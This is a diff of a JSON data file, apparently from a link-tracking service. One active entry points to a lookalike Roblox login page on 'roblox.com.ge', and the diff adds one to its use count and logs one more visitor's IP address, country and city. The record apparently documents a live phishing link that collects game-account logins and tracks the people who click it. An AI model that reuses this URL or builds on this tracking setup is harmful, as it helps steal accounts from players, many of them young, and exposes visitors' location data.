@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1300,
+    "useCount": 1301,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10544,6 +10544,14 @@
         "city": "Alexandria",
         "flag": "🇷🇴",
         "countryCode": "RO"
+      },
+      {
+        "timestamp": 1777374174838,
+        "ip": "113.182.142.128",
+        "country": "Vietnam",
+        "city": "Dĩ An",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
       }
     ]
   },
